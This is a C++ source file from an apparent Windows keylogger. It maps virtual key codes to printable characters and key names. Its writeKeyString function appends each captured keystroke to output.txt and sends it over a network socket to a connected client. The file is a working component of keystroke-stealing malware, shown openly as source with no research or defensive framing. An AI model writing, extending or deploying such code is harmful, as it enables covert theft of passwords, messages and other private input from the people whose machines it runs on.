#include "mappings.h"
#include "constants.h"

#include <iostream>
#include <windows.h>
#include <fstream>
#include <winsock2.h>

void Maps::initializeMaps()
{
    asciiMaps =
    {
        {COMMA, 44}, {EQUAL, 61},
        {PERIOD, 46}, {SEMICOLON, 59},
        {OBRACKETL, 91}, {OBRACKETR, 93},
        {APOSTROPHE, 39}, {VERGULE, 47},
        {BACKSLASH, 92}, {HYPHEN, 45},
        {ACUTE, 96},
    };

    shiftMaps =
    {
        {OBRACKETL, 123}, {OBRACKETR, 125},
        {BACKSLASH, 124}, {SEMICOLON, 58},
        {APOSTROPHE, 34}, {COMMA, 60},
        {PERIOD, 62}, {VERGULE, 63},
        {HYPHEN, 95}, {EQUAL, 43},

        {48, 41}, {49, 33},
        {50, 64}, {51, 35},
        {52, 36}, {53, 37},
        {54, 94}, {55, 38},
        {56, 42}, {57, 40},
    };

    miscMaps =
    {
        // include mappings for up, down, left, right arrow keys.
        {112, F1}, {113, F2},
        {114, F3}, {115, F4},
        {116, F5}, {117, F6},
        {118, F7}, {119, F8},
        {120, F9}, {121, F10},
        {122, F11}, {123, F12},

        {9, TAB}, {162, CTRL_L},
        {163, CTRL_R}, {164, ALT_L},
        {165, ALT_R}, {91, WINKEY},
        {33, PGUP}, {34, PGDOWN},
        {36, HOME}, {35, END},
        {45, INSERT}, {46, DEL},
        {8, BACKSPACE}, {37, LEFT},
        {38, UP}, {39, RIGHT},
        {40, DOWN}
    };


}

void Maps::writeKeyString(std::string key, SOCKET sObjClient)
{
    if (sObjClient != INVALID_SOCKET)
    {
      char keyArray[key.length()+1];
      for (int i = 0; key[i] != '\0'; i++)
      {
          keyArray[i] = key[i];
      }
      keyArray[key.length()] = '\0';
      send(sObjClient, keyArray, (key.length()+1), MSG_OOB);
    }
    std::ofstream file;
    file.open("output.txt", std::ios::app);
    file << key;
    file.close();
}

int Maps::searchAsciiMaps(int key)
{
    auto asciiBeg = asciiMaps.begin();
    auto asciiEnd = asciiMaps.end();

    while (asciiBeg != asciiEnd)
    {
        if (asciiBeg->first == key)
        {
            return asciiBeg->second;
        }
        asciiBeg++;
    }
    return 1;
}

int Maps::searchShiftMaps(int key)
{
    auto shiftBeg = shiftMaps.begin();
    auto shiftEnd = shiftMaps.end();

    while (shiftBeg != shiftEnd)
    {
        if (shiftBeg->first == key)
        {
            return shiftBeg->second;
        }
        shiftBeg++;
    }
    return 1;
}

int Maps::searchMiscMaps(int key, SOCKET sObjClient)
{
    auto miscBeg = miscMaps.begin();
    auto miscEnd = miscMaps.end();

    while (miscBeg != miscEnd)
    {
        if (miscBeg->first == key)
        {
            writeKeyString(miscBeg->second, sObjClient);
            return 0;
        }
        miscBeg++;
    }
    return 1;
}
